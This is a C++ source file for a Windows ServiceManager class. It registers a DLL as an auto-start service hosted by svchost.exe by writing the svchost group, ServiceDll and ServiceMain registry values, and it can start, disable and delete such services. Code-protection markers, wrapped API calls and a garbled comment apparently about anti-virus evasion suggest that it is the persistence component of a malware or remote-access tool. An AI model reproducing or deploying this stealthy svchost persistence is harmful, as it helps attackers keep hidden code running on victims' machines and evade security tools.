#include "StdAfx.h"
#include "peutils/peutils.h"
#include "BinNames.h"
#include "ServiceManager.h"
#include "rpc/RpcServiceManager.h"

ServiceManager::ServiceManager(void)
{

}

ServiceManager::~ServiceManager(void)
{

}

BOOL ServiceManager::StartService(LPCTSTR serviceName)
{
	SC_HANDLE sch = NULL;
	SC_HANDLE hService = NULL;
	BOOL bRet = FALSE;

	do 
	{
		sch = ::OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		if (NULL == sch)
		{
			break;
		}

		hService = ::OpenService(sch, serviceName, SERVICE_ALL_ACCESS);
		if (NULL == hService)
		{
			break;
		}

		bRet= ::StartService( hService, NULL, NULL );
	} while (FALSE);

	if (NULL != hService) ::CloseServiceHandle(hService);
	if (NULL != sch) ::CloseServiceHandle(sch);

	return bRet;
}

BOOL ServiceManager::InstallSvchostService(LPCTSTR serviceName, LPCTSTR displayName, LPCTSTR descripion, LPCTSTR filepath, LPCTSTR svchostName)
{
	BOOL bSuccess = FALSE;
	CODE_MARK_BEGIN();
	//√‚…±ServiceMain
	std::wstring strServiceMainName = _T("Main");

	SC_HANDLE sch = ::LOpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if(sch == NULL)
	{
		errorLogE(_T("openscmanager error"));
		return FALSE;
	}

	SC_HANDLE hService = NULL;
	HKEY hSvchostKey = NULL;
	HKEY hServiceKey = NULL;
	HKEY hParametersKey = NULL;

	do 
	{
		LONG lRet = ::RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\svchost"), 0, KEY_QUERY_VALUE | KEY_WRITE, &hSvchostKey);
		if(ERROR_SUCCESS != lRet)
		{
			errorLogE(_T("open svchost failed"));
			break;
		}

		lRet = RegSetValueEx(hSvchostKey, svchostName, 0, REG_MULTI_SZ, (const BYTE*)serviceName, _tcslen(serviceName) * sizeof(TCHAR));
		if (ERROR_SUCCESS != lRet)
		{
			errorLogE(_T("set svchost set failed"));
			break;
		}

		tstring binpath = _T("%SystemRoot%\\system32\\svchost.exe -k ");
		binpath += svchostName;

		hService = ::LCreateServiceW(sch, serviceName, displayName, SERVICE_ALL_ACCESS, SERVICE_WIN32_SHARE_PROCESS, SERVICE_AUTO_START,
			SERVICE_ERROR_NORMAL, binpath.c_str(), NULL, NULL, NULL, NULL, NULL);
		if(NULL == hService)
		{
			errorLogE(_T("create service failed.[%s][%s]"), serviceName, binpath.c_str());
			break;
		}

		SERVICE_DESCRIPTION desc;
		desc.lpDescription = (LPTSTR) descripion; 
		ChangeServiceConfig2(hService, SERVICE_CONFIG_DESCRIPTION, &desc);
		CloseServiceHandle(sch);

		tstring newserviceRegpath = _T("SYSTEM\\CurrentControlSet\\Services\\");
		newserviceRegpath += serviceName;
		lRet = ::RegOpenKeyEx(HKEY_LOCAL_MACHINE, newserviceRegpath.c_str(), 0, KEY_ALL_ACCESS, &hServiceKey);
		if(ERROR_SUCCESS != lRet)
		{
			errorLog(_T("open service reg key failed %u"), lRet);
			break;
		}
		int nValue = 1;
		lRet = ::RegSetValueEx(hServiceKey,_T("WOW64"),0,REG_DWORD,(BYTE*)&nValue,sizeof(int));

		if (ERROR_SUCCESS != lRet)
		{
			errorLog(_T("set wow64 key failed %u"), lRet);
			break;
		}

		lRet = ::RegCreateKey(hServiceKey, _T("Parameters"), &hParametersKey);
		if (ERROR_SUCCESS != lRet)
		{
			errorLog(_T("create parameters key failed %u"), lRet);
			break;
		}

		tstring unicodeFilepath = filepath;
		lRet = RegSetValueEx(hParametersKey, _T("ServiceDll"), 0, REG_EXPAND_SZ, (const BYTE*)unicodeFilepath.c_str(), unicodeFilepath.size() * sizeof(TCHAR));
		if (ERROR_SUCCESS != lRet)
		{
			errorLog(_T("set servicedll failed 1. %u"), lRet);
			break;
		}

		lRet = RegSetValueEx(hParametersKey, _T("ServiceMain"), 0, REG_SZ, (const BYTE*)strServiceMainName.c_str(), strServiceMainName.size() * sizeof(TCHAR));
		if (ERROR_SUCCESS != lRet)
		{
			errorLog(_T("set servicedll failed 2. %u"), lRet);
			break;
		}

		bSuccess = TRUE;
	} while (FALSE);

	if (NULL != hParametersKey) ::RegCloseKey(hParametersKey);
	if (NULL != hServiceKey) ::RegCloseKey(hServiceKey);
	if (NULL != hService) ::CloseServiceHandle(hService);
	if (NULL != sch) ::CloseServiceHandle(sch);
	if (NULL != hSvchostKey) ::RegCloseKey(hSvchostKey);
	CODE_MARK_END();

	return bSuccess;
}

BOOL ServiceManager::DeleteSvchostService(LPCTSTR serviceName, LPCTSTR svchostName)
{
	SC_HANDLE sch = ::OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if(sch==NULL)
	{
		errorLogE(_T("openscmanager error."));
		return FALSE;
	}

	SC_HANDLE hService = NULL;
	HKEY hSvchostKey = NULL;
	BOOL bSuccess = FALSE;
	do 
	{
		hService = OpenService(sch, serviceName, SERVICE_ALL_ACCESS);
		if (NULL == hService)
		{
			errorLogE(_T("open service failed."));
			break;
		}

		if (! ::DeleteService(hService))
		{
			errorLogE(_T("delete service failed."));
			break;
		}

		LONG lRet = ::RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\svchost"), 0, KEY_QUERY_VALUE | KEY_WRITE, &hSvchostKey);
		if(ERROR_SUCCESS != lRet)
		{
			errorLogE(_T("open svchost failed."));
			break;
		}

		::RegDeleteValue(hSvchostKey, svchostName);

		bSuccess = TRUE;
	} while (FALSE);

	if (NULL != hService) ::CloseServiceHandle(hService);
	if (NULL != sch) ::CloseServiceHandle(sch);
	if (NULL != hSvchostKey) ::RegCloseKey(hSvchostKey);

	return bSuccess;
}

BOOL ServiceManager::StopService(LPCTSTR serviceName,LPCTSTR svchostName)
{
	SC_HANDLE sch = ::OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if(sch == NULL)
	{
		errorLogE(_T("openscmanager error."));
		return FALSE;
	}

	SC_HANDLE hService = NULL;
	HKEY hSvchostKey = NULL;
	BOOL bSuccess = FALSE;
	do 
	{
		hService = OpenService(sch, serviceName, SERVICE_ALL_ACCESS);
		if (NULL == hService)
		{
			errorLogE(_T("open service failed."));
			break;
		}

		if (! ::ChangeServiceConfig(
			hService,		   // handle of service   
			SERVICE_NO_CHANGE, // service type: no change   
			SERVICE_DISABLED,  // service start type   
			SERVICE_NO_CHANGE, // error control: no change    
			NULL,              // binary path: no change   
			NULL,              // load order group: no change   
			NULL,              // tag ID: no change   
			NULL,              // dependencies: no change   
			NULL,              // account name: no change   
			NULL,              // password: no change   
			NULL) )            // display name: no change  
		{
			errorLogE(_T("delete service failed."));
			break;
		}

		LONG lRet = ::RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\svchost"), 0, KEY_QUERY_VALUE | KEY_WRITE, &hSvchostKey);
		if(ERROR_SUCCESS != lRet)
		{
			errorLogE(_T("open svchost failed."));
			break;
		}

		::RegDeleteValue(hSvchostKey, svchostName);

		bSuccess = TRUE;
	} while (FALSE);

	if (NULL != hService) ::CloseServiceHandle(hService);
	if (NULL != sch) ::CloseServiceHandle(sch);
	if (NULL != hSvchostKey) ::RegCloseKey(hSvchostKey);

	return bSuccess;
}
